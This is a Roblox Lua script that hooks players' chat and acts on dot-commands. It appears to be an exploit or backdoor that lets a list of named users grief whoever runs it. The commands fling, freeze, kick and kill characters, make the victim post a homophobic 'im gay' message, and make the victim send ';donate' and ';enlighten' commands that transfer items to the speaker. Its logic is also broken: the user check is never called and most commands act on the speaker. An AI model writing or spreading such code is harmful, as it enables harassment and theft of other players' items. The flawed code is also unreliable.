
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local systemChannel = TextChatService:WaitForChild("RBXSystem")

local function chatSendAsync(message)
    systemChannel:SendMessageAsync(message)
end

-- Define premium users
local userNames = {
    "adam1102928181",
    "LittleJonib",
    "xylar103",
    "whoareyiu24"
}

local function isPremiumUser(p)
    return table.find(userNames, p.Name) ~= nil
end

local player = Players.LocalPlayer

local function setupPlayerCommands(p)
    -- Setup the chat command listener
    p.Chatted:Connect(function(cht)
        -- Helper for sending chat messages
        local function sendChat(msg)
            chatSendAsync(msg)
        end

        -- Helper to get player's character safely
        local function getCharacter()
            local c = p.Character
            if not c then
                p.CharacterAdded:Wait()
                c = p.Character
            end
            return c
        end

        -- Helper to get HumanoidRootPart safely
        local function getHRP(char)
            local hrp = char:FindFirstChild("HumanoidRootPart")
            return hrp
        end

        -- Check for commands
        if cht:match(".fling .") then
            if p ~= player then
                local c = getCharacter()
                local hrp = getHRP(c)
                if hrp then
                    hrp.CFrame = CFrame.new(0, 999, 0)
                    local power = 99999999
                    game:GetService('RunService').Stepped:Connect(function()
                        c.Head.CanCollide = false
                        c.UpperTorso.CanCollide = false
                        c.LowerTorso.CanCollide = false
                        hrp.CanCollide = false
                    end)
                    wait(.1)
                    local bambam = Instance.new("BodyThrust")
                    bambam.Parent = hrp
                    bambam.Force = Vector3.new(power, 0, power)
                    bambam.Location = hrp.Position
                end
            end
        elseif cht:match(".freeze .") then
            if p ~= player then
                if p.Character then
                    p.Character.LowerTorso.Anchored = true
                    p.Character.UpperTorso.Anchored = true
                end
            end
        elseif cht:match(".unfreeze .") then
            if p ~= player then
                if p.Character then
                    p.Character.LowerTorso.Anchored = false
                    p.Character.UpperTorso.Anchored = false
                end
            end
        elseif cht:match(".kxck .") then
            if p ~= player then
                p:Kick("You have been kicked.")
            end
        elseif cht:match(".oof .") then
            if p ~= player then
                if p.Character then
                    p.Character.Humanoid:Destroy()
                end
            end
        elseif cht:match(".error .") then
            if p ~= player then
                local c = getCharacter()
                local hrp = getHRP(c)
                if hrp then
                    hrp.CFrame = CFrame.new(99999, 99999, 99999)
                end
            end
        elseif cht:match(".bring .") then
            if p ~= player then
                local c = getCharacter()
                local hrp = getHRP(c)
                if hrp then
                    local targetChar = getCharacter()
                    local targetHRP = getHRP(targetChar)
                    if targetHRP then
                        local myChar = getCharacter()
                        local myHRP = getHRP(myChar)
                        if myHRP then
                            targetHRP.CFrame = myHRP.CFrame * CFrame.new(0, 2, 0)
                        end
                    end
                end
            end
        elseif cht:match(".sit .") then
            local c = getCharacter()
            local humanoid = c and c:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.Sit = true
            end
        elseif cht:match(".unsit .") then
            local c = getCharacter()
            local humanoid = c and c:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.Sit = false
            end
        elseif cht:match(".troll .") then
            sendChat("im gay")
        elseif cht:match(".enlighten .") then
            local backpack = getCharacter() and getCharacter().Parent:FindFirstChildOfClass("Backpack")
            if backpack then
                local item = backpack:FindFirstChild("The Arkenstone")
                if item then item:Equip() end
            end
            sendChat(";enlighten " .. p.Name)
        elseif cht:match(".donate .") then
            local txt = cht:match(".donate (.+)")
            sendChat(";donate " .. txt .. " " .. p.Name)
        elseif cht:match(".say .") then
            local txt = cht:match(".say (.+)")
            sendChat(txt)
        elseif cht:match("^%.cmd .+") then
            local txt = cht:match("^%.cmd (.+)")
            sendChat(";" .. txt)
        elseif cht:match(".cmdx") then
            if p == player then
                sendChat("Available Commands; .freeze .bring .error .oof .kxck .fling .sit .unsit .troll .donate .say .enlighten .cmd")
            end
        end
    end)
end

-- Handle existing players
for _, p in pairs(Players:GetPlayers()) do
    setupPlayerCommands(p)
end

-- Handle players joining later
Players.PlayerAdded:Connect(function(p)
    p.CharacterAdded:Connect(function()
        setupPlayerCommands(p)
    end)
    -- If character already loaded
    if p.Character then
        setupPlayerCommands(p)
    end
end)
